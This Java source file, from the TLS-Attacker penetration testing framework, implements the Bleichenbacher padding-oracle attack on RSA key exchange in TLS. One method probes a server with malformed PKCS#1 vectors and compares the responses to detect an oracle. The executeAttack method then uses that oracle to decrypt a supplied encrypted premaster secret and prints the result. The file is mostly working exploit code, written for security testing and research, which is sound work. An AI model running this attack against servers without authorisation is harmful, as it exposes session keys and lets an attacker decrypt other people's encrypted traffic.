/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.core.exceptions.AttackFailedException;
import de.rub.nds.tlsattacker.core.exceptions.OracleUnstableException;
import de.rub.nds.tlsattacker.attacks.padding.VectorResponse;
import de.rub.nds.tlsattacker.attacks.padding.vector.FingerprintTaskVectorPair;
import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1Vector;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1VectorGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.attacks.task.FingerPrintTask;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityError;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityErrorTranslator;
import de.rub.nds.tlsattacker.attacks.util.response.FingerPrintChecker;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.Bits;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
import de.rub.nds.tlsattacker.core.workflow.task.TlsTask;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses. In case there are
 * differences in the server responses, it is very likely that it is possible to execute Bleichenbacher attacks.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config tlsConfig;

    private boolean increasingTimeout = true;

    private long additionalTimeout = 1000;

    private long additionalTcpTimeout = 5000;

    private List<VectorResponse> fullResponseMap;

    private EqualityError resultError;

    private CipherSuite testedSuite;

    private ProtocolVersion testedVersion;

    private final ParallelExecutor executor;

    private boolean shakyScans = false;
    private boolean erroneousScans = false;

    /**
     *
     * @param bleichenbacherConfig
     * @param baseConfig
     */
    public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        super(bleichenbacherConfig, baseConfig);
        tlsConfig = getTlsConfig();
        executor = new ParallelExecutor(1, 3);
    }

    /**
     *
     * @param bleichenbacherConfig
     * @param baseConfig
     * @param executor
     */
    public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig,
        ParallelExecutor executor) {
        super(bleichenbacherConfig, baseConfig);
        tlsConfig = getTlsConfig();
        this.executor = executor;
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        CONSOLE
            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
        CONSOLE.info("A server is considered secure if it always responds the same way.");
        EqualityError referenceError = null;
        fullResponseMap = new LinkedList<>();
        try {
            for (int i = 0; i < config.getNumberOfIterations(); i++) {
                List<VectorResponse> responseMap = createVectorResponseList();
                this.fullResponseMap.addAll(responseMap);
            }
        } catch (AttackFailedException e) {
            CONSOLE.info(e.getMessage());
            return null;
        }
        referenceError = getEqualityError(fullResponseMap);
        if (referenceError != EqualityError.NONE) {
            CONSOLE.info("Found a behavior difference within the responses. The server could be vulnerable.");
        } else {
            CONSOLE
                .info("Found no behavior difference within the responses. The server is very likely not vulnerable.");
        }

        CONSOLE.info(EqualityErrorTranslator.translation(referenceError, null, null));
        if (referenceError != EqualityError.NONE || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
            LOGGER.debug("-------------(Not Grouped)-----------------");
            for (VectorResponse vectorResponse : fullResponseMap) {
                LOGGER.debug(vectorResponse.toString());
            }
        }

        resultError = referenceError;
        return referenceError != EqualityError.NONE;
    }

    /**
     *
     * @return
     */
    public List<VectorResponse> createVectorResponseList() {
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }
        List<TlsTask> taskList = new LinkedList<>();
        List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
            tlsConfig.getDefaultHighestClientProtocolVersion())) {
            State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
                config.getWorkflowType(), vector.getEncryptedValue()));
            FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
                executor.getReexecutions(), additionalTcpTimeout);
            taskList.add(fingerPrintTask);
            stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
        }
        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
        executor.bulkExecuteTasks(taskList);
        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
            ResponseFingerprint fingerprint = null;
            if (pair.getFingerPrintTask().isHasError()) {
                erroneousScans = true;
                LOGGER.warn("Could not extract fingerprint for " + pair.toString());
            } else {
                testedSuite = pair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
                testedVersion = pair.getFingerPrintTask().getState().getTlsContext().getSelectedProtocolVersion();
                if (testedSuite == null || testedVersion == null) {
                    LOGGER.fatal("Could not find ServerHello after successful extraction");
                    throw new OracleUnstableException("Fatal Extraction error");
                }
                fingerprint = pair.getFingerPrintTask().getFingerprint();
                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
            }
        }
        // Check that the public key send by the server is actually the public key used to generate the vectors. This is
        // currently a limitation of our script as the attack vectors are generated statically and not dynamically. We
        // will adjust this in future versions.
        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
            if (pair.getFingerPrintTask().getState().getTlsContext().getServerRSAModulus() != null && !pair
                .getFingerPrintTask().getState().getTlsContext().getServerRSAModulus().equals(publicKey.getModulus())) {
                throw new OracleUnstableException(
                    "Server sent us a different publickey during the scan. Aborting test");
            }
        }
        return tempResponseVectorList;
    }

    /**
     * This assumes that the responseVectorList only contains comparable vectors
     *
     * @param  responseVectorList
     * @return
     */
    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {

        for (VectorResponse responseOne : responseVectorList) {
            for (VectorResponse responseTwo : responseVectorList) {
                if (responseOne == responseTwo) {
                    continue;
                }
                EqualityError error =
                    FingerPrintChecker.checkEquality(responseOne.getFingerprint(), responseTwo.getFingerprint());
                if (error != EqualityError.NONE) {
                    CONSOLE.info("Found an EqualityError: " + error);
                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
                    return error;
                }

            }
        }
        return EqualityError.NONE;
    }

    public RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);
        return publicKey;
    }

    @Override
    public void executeAttack() {
        LOGGER.info("Using the following oracle type: {}", config.getWorkflowType());

        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to the Bleichenbacher attack");
            return;
        }
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedPremasterSecret() == null) {
            throw new ConfigurationException(
                "You have to set the encrypted premaster secret you are " + "going to decrypt");
        }

        LOGGER.info("Fetched the following server public key: " + publicKey);
        byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
        if ((pms.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException("The length of the encrypted premaster secret you have "
                + "is not equal to the server public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(),
            extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
            config.getWorkflowType());
        Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        CONSOLE.info(solution.toString(16));
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version);
        State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
            config.getWorkflowType(), vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
            executor.getReexecutions(), additionalTcpTimeout);
        FingerprintTaskVectorPair stateVectorPair = new FingerprintTaskVectorPair(fingerPrintTask, vector);
        executor.bulkExecuteTasks(fingerPrintTask);
        ResponseFingerprint fingerprint = null;
        if (stateVectorPair.getFingerPrintTask().isHasError()) {
            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair.toString());
        } else {
            testedSuite = stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
            testedVersion =
                stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedProtocolVersion();
            if (testedSuite == null || testedVersion == null) {
                LOGGER.fatal("Could not find ServerHello after successful extraction");
                throw new OracleUnstableException("Fatal Extraction error");
            }
            fingerprint = fingerPrintTask.getFingerprint();
        }
        return fingerprint;
    }

    public EqualityError getResultError() {
        return resultError;
    }

    public List<VectorResponse> getResponseMapList() {
        return fullResponseMap;
    }

    public CipherSuite getTestedSuite() {
        return testedSuite;
    }

    public ProtocolVersion getTestedVersion() {
        return testedVersion;
    }

    public boolean isShakyScans() {
        return shakyScans;
    }

    public boolean isErrornousScans() {
        return erroneousScans;
    }

    public boolean isIncreasingTimeout() {
        return increasingTimeout;
    }

    public void setIncreasingTimeout(boolean increasingTimeout) {
        this.increasingTimeout = increasingTimeout;
    }

    public long getAdditionalTimeout() {
        return additionalTimeout;
    }

    public void setAdditionalTimeout(long additionalTimeout) {
        this.additionalTimeout = additionalTimeout;
    }

    public long getAdditionalTcpTimeout() {
        return additionalTcpTimeout;
    }

    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
        this.additionalTcpTimeout = additionalTcpTimeout;
    }

}
